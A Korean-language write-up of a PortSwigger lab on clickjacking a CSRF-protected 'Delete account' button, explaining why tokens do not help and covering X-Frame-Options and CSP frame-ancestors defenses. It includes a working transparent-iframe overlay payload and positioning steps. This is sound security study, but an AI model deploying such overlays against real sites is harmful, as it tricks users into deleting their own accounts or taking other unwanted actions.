# Lab: Basic clickjacking with CSRF token protection

## 개요

- **난이도**: Apprentice
- **주제**: Clickjacking — 기본 클릭재킹 / iframe 오버레이 / CSRF 토큰 우회
- **링크**: https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected

## 목표

CSRF 토큰으로 보호된 "Delete account" 버튼을 클릭재킹으로 피해자가 클릭하게 만들어 계정을 삭제한다.

## 클릭재킹이 CSRF 토큰을 우회하는 이유

```
[CSRF 공격 vs 클릭재킹 비교]

CSRF 공격:
  공격자 페이지에서 피해자 사이트로 위조 요청 전송
  → CSRF 토큰이 없음 → 서버 거부
  → CSRF 토큰으로 방어 가능

클릭재킹:
  피해자 사이트를 iframe 으로 로드 → CSRF 토큰 포함된 실제 페이지
  → 피해자가 직접 클릭 → 브라우저가 실제 요청 전송
  → CSRF 토큰도 정상적으로 포함됨 → 서버 허용!

핵심:
  클릭재킹은 "위조 요청"이 아니라
  "피해자가 진짜 버튼을 클릭하게 속이는" 것
  → CSRF 토큰은 이 상황에서 무의미
```

## 공격 구조

```
[피해자 화면에 보이는 것]      [실제 DOM 구조]
                               z-index: 2 (위)  z-index: 1 (아래)
  ┌─────────────────┐          ┌─────────────────────────────────┐
  │                 │          │  투명 iframe                    │
  │  이벤트 당첨!   │          │  (실제 타겟 사이트)              │
  │                 │          │                                 │
  │  [Click here!]  │          │      [Delete account]           │
  └─────────────────┘          └─────────────────────────────────┘
         ↑                              ↑
   피해자가 보는 버튼              실제 클릭되는 버튼
   (decoy)                       (투명 iframe 안)

피해자: "Click here!" 클릭
실제:   Delete account 버튼 클릭됨
```

## 공격 방법

### iframe 위치 조정 원리

```
1. 타겟 사이트를 iframe 으로 로드
2. iframe 을 투명하게 만듦 (opacity 낮춤)
3. "Delete account" 버튼이 decoy 버튼 위에 정확히 겹치도록 위치 조정
4. opacity 를 0으로 낮춰 iframe 을 완전히 숨김
5. 피해자는 decoy 버튼을 클릭하지만 실제로는 Delete account 클릭
```

### 페이로드

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;        /* 개발 중 위치 조정용: 0.5~0.1 */
        /* opacity: 0.0001;  최종 공격 시: 거의 투명 */
        z-index: 2;
    }
    #decoy {
        position: absolute;
        top: 300px;          /* Delete button 위치에 맞게 조정 */
        left: 60px;
        z-index: 1;
    }
</style>

<div id="decoy">Click me!</div>
<iframe src="https://VULNERABLE.com/my-account"></iframe>
```

### 위치 조정 방법

```
1. opacity: 0.5 로 설정해 iframe 을 반투명으로 만듦
2. top / left 값을 조정해 Delete account 버튼을 decoy 위에 맞춤
3. 위치가 맞으면 opacity: 0.0001 로 낮춰 최종 공격 완성

Delete 버튼 위치 확인:
  브라우저 개발자 도구 → 버튼 요소 검사
  → 버튼의 대략적인 화면 위치 확인 후 top/left 조정
```

### 실행 흐름

```
1. 피해자: exploit 페이지 방문
   → 화면에는 "Click me!" 버튼만 보임

2. 피해자: "Click me!" 클릭
   → 실제로는 iframe 안의 "Delete account" 버튼 클릭

3. 브라우저:
   POST /my-account/delete
   Cookie: session=VICTIM_SESSION   ← 자동 첨부
   csrf=REAL_CSRF_TOKEN             ← iframe 에서 정상 로드된 토큰

4. 서버: 정상 요청으로 처리 → 계정 삭제
```

## CSRF 토큰과 클릭재킹의 관계

```
CSRF 토큰이 방어하는 것:
  공격자 도메인에서 전송된 위조 요청
  (공격자가 CSRF 토큰 값을 모름)

CSRF 토큰이 방어하지 못하는 것:
  클릭재킹: iframe 이 실제 페이지를 로드하므로
            CSRF 토큰이 이미 HTML 에 포함되어 있음
            피해자가 직접 클릭 → 토큰 포함된 정상 요청

→ 클릭재킹 방어는 별도 메커니즘 필요:
  X-Frame-Options: DENY  (iframe 내 로드 차단)
  CSP: frame-ancestors 'none'
```

## 핵심 정리

- 클릭재킹은 투명한 iframe 으로 피해자 사이트를 올려, 피해자가 decoy UI 를 클릭하는 척 실제 버튼을 클릭하게 만든다.
- CSRF 토큰은 위조 요청을 막지만, 클릭재킹은 실제 페이지에서 직접 클릭이 일어나므로 토큰이 자동 포함되어 방어 무효.
- **방어**:
  - `X-Frame-Options: DENY` — 모든 사이트의 iframe 로드 차단
  - `X-Frame-Options: SAMEORIGIN` — 같은 사이트에서만 iframe 허용
  - `Content-Security-Policy: frame-ancestors 'none'` — 현대적 방어 (CSP 기반)

## 배운 점 및 추가 학습

### X-Frame-Options vs CSP frame-ancestors

```
[X-Frame-Options] (구형)
  X-Frame-Options: DENY         → 어디서도 iframe 불가
  X-Frame-Options: SAMEORIGIN   → 같은 출처에서만 허용
  X-Frame-Options: ALLOW-FROM https://partner.com  → 특정 도메인 허용

  단점:
  - ALLOW-FROM 은 일부 브라우저 미지원
  - 여러 도메인 허용 불가

[CSP frame-ancestors] (현대적, 권장)
  Content-Security-Policy: frame-ancestors 'none'
  Content-Security-Policy: frame-ancestors 'self'
  Content-Security-Policy: frame-ancestors https://partner.com https://other.com

  장점:
  - 여러 도메인 허용 가능
  - X-Frame-Options 보다 우선순위 높음
  - 현대 브라우저 모두 지원
```

### iframe 의 same-origin 정책

```
iframe 으로 외부 사이트 로드 시:
  → 부모 페이지(evil.com) JS 에서 iframe 내용 접근 불가
  → document.querySelector('iframe').contentDocument → null (보안 차단)

클릭재킹에서는 JS 접근이 필요 없음:
  → 시각적 오버레이만으로 충분
  → 피해자의 클릭이 iframe 내 요소에 전달됨
  → JS 없이도 클릭 이벤트는 정상 전달
```
